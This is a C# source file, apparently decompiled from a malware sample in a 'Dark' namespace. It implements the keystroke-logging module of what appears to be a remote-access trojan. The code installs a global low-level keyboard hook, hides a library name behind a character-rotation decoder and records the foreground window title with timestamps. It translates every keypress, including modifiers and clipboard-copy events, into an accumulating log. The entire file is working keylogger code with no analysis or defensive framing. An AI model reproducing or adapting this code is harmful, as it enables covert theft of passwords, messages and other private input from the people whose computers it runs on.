using System;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Dark;

public class KeyBoardHook : ApplicationContext
{
	public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);

	public struct keyboardHookStruct
	{
		public int VkC;

		public int SC;

		public int F;

		public int Tme;

		public int ExtrInf;
	}

	private KeyEventHandler KeyDownEvent;

	private KeyEventHandler KeyUpEvent;

	private IntPtr HK;

	private keyboardHookProc hookProcDelegate;

	public static bool EditLogs = true;

	public static bool Shift = false;

	public static bool Control = false;

	public static bool NumLock = false;

	public static string CurrentWindowTemp = "Y";

	public static string CurrentWindow = "X";

	[AccessedThroughProperty("T")]
	private static Timer _T;

	public static KeyEventArgs TL = null;

	public static Timer T
	{
		get
		{
			return _T;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_T = value;
		}
	} = new Timer();


	public event KeyEventHandler KeyDown
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			KeyDownEvent = (KeyEventHandler)Delegate.Combine((Delegate?)(object)KeyDownEvent, (Delegate?)(object)value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			KeyDownEvent = (KeyEventHandler)Delegate.Remove((Delegate?)(object)KeyDownEvent, (Delegate?)(object)value);
		}
	}

	public event KeyEventHandler KeyUp
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			KeyUpEvent = (KeyEventHandler)Delegate.Combine((Delegate?)(object)KeyUpEvent, (Delegate?)(object)value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			KeyUpEvent = (KeyEventHandler)Delegate.Remove((Delegate?)(object)KeyUpEvent, (Delegate?)(object)value);
		}
	}

	public KeyBoardHook()
	{
		HK = IntPtr.Zero;
		hookProcDelegate = HookP;
		HK = NativeMethods.SetWindowsHookEx(13, hookProcDelegate, NativeMethods.LoadLibrary(NativeMethods.RotateRight("Pn`m.-")), 0u);
	}

	public void unhook()
	{
		NativeMethods.UnhookWindowsHookEx(HK);
	}

	public int HookP(int Cde, int WP, ref keyboardHookStruct LP)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		if (Cde >= 0)
		{
			try
			{
				KeyEventArgs val = new KeyEventArgs((Keys)LP.VkC);
				switch (WP)
				{
				case 257:
				case 261:
				{
					KeyEventHandler keyDownEvent = KeyUpEvent;
					if (keyDownEvent != null)
					{
						keyDownEvent.Invoke((object)null, val);
					}
					break;
				}
				case 256:
				case 260:
				{
					KeyEventHandler keyDownEvent = KeyDownEvent;
					if (keyDownEvent != null)
					{
						keyDownEvent.Invoke((object)null, val);
					}
					break;
				}
				}
				if (val.get_Handled())
				{
					return 1;
				}
				return 0;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return NativeMethods.CallNextHookEx(HK, Cde, WP, ref LP);
	}

	public static void WK(string Str)
	{
		if (Operators.CompareString(Str, NativeMethods.RotateRight("V=<>FNK<>@X"), false) == 0 && NativeMethods.log.Length > 1 && EditLogs)
		{
			NativeMethods.log = NativeMethods.log.Remove(NativeMethods.log.Length - 1, 1);
		}
		else if (Operators.CompareString(Str, NativeMethods.RotateRight("V@IO@MX"), false) == 0 && EditLogs)
		{
			NativeMethods.log += Environment.NewLine;
		}
		else
		{
			NativeMethods.log += Str;
		}
	}

	public void Start()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		T = new Timer();
		T.set_Interval(SystemInformation.get_KeyboardDelay() * SystemInformation.get_KeyboardSpeed() * 8);
		T.add_Tick((EventHandler)T_Tick);
		MainCore.Keyboard.KeyDown += new KeyEventHandler(K_KeyDown);
		MainCore.Keyboard.KeyUp += new KeyEventHandler(K_KeyUp);
		T.Start();
	}

	public static void T_Tick(object sender, EventArgs e)
	{
		if (TL != null)
		{
			Translate(TL);
		}
	}

	public static void GetWindow()
	{
		try
		{
			IntPtr foregroundWindow = NativeMethods.GetForegroundWindow();
			if (!(foregroundWindow == IntPtr.Zero))
			{
				CurrentWindow = Strings.StrDup(NativeMethods.GetWindowTextLengthA((long)foregroundWindow), "*");
				NativeMethods.GetWindowTextA(foregroundWindow, ref CurrentWindow, CurrentWindow.Length + 1);
				if (Operators.CompareString(CurrentWindow, CurrentWindowTemp, false) != 0)
				{
					CurrentWindowTemp = CurrentWindow;
					WK(Environment.NewLine + Environment.NewLine + "[" + CurrentWindow + "][" + Conversions.ToString(DateTime.Now) + "]" + Environment.NewLine + Environment.NewLine);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void K_KeyDown(object sender, KeyEventArgs e)
	{
		switch (e.get_KeyValue())
		{
		case 144:
			NumLock = true;
			break;
		default:
			TL = e;
			break;
		case 160:
			Shift = true;
			break;
		case 161:
			Shift = true;
			break;
		case 162:
			Control = true;
			WK("[CTRL]");
			break;
		case 163:
			Control = true;
			WK("[CTRL]");
			break;
		}
	}

	public static void K_KeyUp(object sender, KeyEventArgs e)
	{
		TL = null;
		T.Stop();
		switch (e.get_KeyValue())
		{
		case 144:
			NumLock = false;
			break;
		default:
			Translate(e);
			break;
		case 160:
			Shift = false;
			break;
		case 161:
			Shift = false;
			break;
		case 162:
			Control = false;
			break;
		case 163:
			Control = false;
			break;
		}
	}

	public static void Translate(KeyEventArgs KE)
	{
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int keyValue = KE.get_KeyValue();
			if (NumLock)
			{
				switch (keyValue)
				{
				case 107:
					WK("+");
					break;
				default:
					WK(keyValue.ToString());
					break;
				case 109:
					WK("-");
					break;
				case 110:
					WK(".");
					break;
				case 111:
					WK("/");
					break;
				}
			}
			if (keyValue > 64 && keyValue < 91)
			{
				if (Control && (double)KE.get_KeyCode() == Conversions.ToDouble("C"))
				{
					WK("[Copied to clipboard]");
				}
				if (Shift)
				{
					WK(((Enum)KE.get_KeyCode()).ToString());
				}
				else
				{
					WK(((Enum)KE.get_KeyCode()).ToString().ToLower());
				}
				return;
			}
			if (keyValue > 111 && keyValue < 122)
			{
				WK(" F" + Conversions.ToString(keyValue - 111) + " ");
				return;
			}
			if (keyValue > 47 && keyValue < 58)
			{
				if (Shift)
				{
					switch (keyValue)
					{
					case 48:
						WK(")");
						break;
					case 49:
						WK("!");
						break;
					case 50:
						WK("\"");
						break;
					case 51:
						WK("?");
						break;
					case 52:
						WK("$");
						break;
					case 53:
						WK("%");
						break;
					case 54:
						WK("^");
						break;
					case 55:
						WK("&");
						break;
					case 56:
						WK("*");
						break;
					case 57:
						WK("(");
						break;
					}
				}
				else
				{
					WK((keyValue - 48).ToString().ToLower());
				}
				return;
			}
			if (keyValue > 95 && keyValue < 106)
			{
				WK(Conversions.ToString(keyValue - 96));
				return;
			}
			switch (keyValue)
			{
			case 188:
				if (Shift)
				{
					WK("<");
				}
				else
				{
					WK(",");
				}
				return;
			case 190:
				if (Shift)
				{
					WK(">");
				}
				else
				{
					WK(".");
				}
				return;
			case 191:
				if (Shift)
				{
					WK("?");
				}
				else
				{
					WK("/");
				}
				return;
			case 220:
				if (Shift)
				{
					WK("|");
				}
				else
				{
					WK("\\");
				}
				return;
			case 223:
				if (Shift)
				{
					WK("?");
				}
				else
				{
					WK("`");
				}
				return;
			case 186:
				if (Shift)
				{
					WK(":");
				}
				else
				{
					WK(";");
				}
				return;
			case 222:
				if (Shift)
				{
					WK("~");
				}
				else
				{
					WK("#");
				}
				return;
			case 219:
				if (Shift)
				{
					WK("{");
				}
				else
				{
					WK("[");
				}
				return;
			case 221:
				if (Shift)
				{
					WK("}");
				}
				else
				{
					WK("]");
				}
				return;
			case 187:
				if (Shift)
				{
					WK("+");
				}
				else
				{
					WK("=");
				}
				return;
			case 189:
				if (Shift)
				{
					WK("_");
				}
				else
				{
					WK("-");
				}
				return;
			case 192:
				if (Shift)
				{
					WK("@");
				}
				else
				{
					WK("'");
				}
				return;
			case 32:
				WK(" ");
				return;
			case 27:
				WK("[ESCAPE]");
				return;
			case 8:
				WK("[BACKSPACE]");
				return;
			case 13:
				WK(Environment.NewLine + "[ENTER]" + Environment.NewLine);
				return;
			case 38:
				WK("[UP]");
				return;
			case 37:
				WK("[LEFT]");
				return;
			case 39:
				WK("[RIGHT]");
				return;
			case 40:
				WK("[DOWN]");
				return;
			case 9:
				WK("[TAB]");
				return;
			case 20:
				WK("[CAPSLOCK]");
				return;
			case 93:
				WK("[ConMenu]");
				return;
			case 33:
				WK("[PAGEUP]");
				return;
			case 34:
				WK("[PAGEDOWN]");
				return;
			case 36:
				WK("[HOME]");
				return;
			case 35:
				WK("[END]");
				return;
			case 46:
				WK("[DELETE]");
				return;
			case 45:
				WK("[PRINTSCREEN]");
				return;
			case 165:
				WK("[RIGHTALT]");
				return;
			case 110:
				WK(".");
				return;
			}
			switch (keyValue)
			{
			case 165:
				WK("[RIGHTALT]");
				return;
			case 107:
				WK("+");
				return;
			case 109:
				WK("-");
				return;
			case 111:
				WK("/");
				return;
			case 106:
				WK("*");
				return;
			case 91:
				WK("[LEFTWINKEY]");
				return;
			case 92:
				WK("[RIGHTWINKEY]");
				return;
			}
			switch (keyValue)
			{
			case 91:
				WK("[LEFTWINKEY]");
				break;
			case 122:
				WK(" F11 ");
				break;
			case 123:
				WK(" F12 ");
				break;
			case 44:
				WK("[PRINTSCREEN]");
				break;
			case 145:
				WK("[SCROLLOCK]");
				break;
			case 19:
				WK("[PAUSEBREAK]");
				break;
			case 164:
				WK("[LEFTALT]");
				break;
			default:
				WK(" [SPECIAL KEY - " + keyValue + "] ");
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
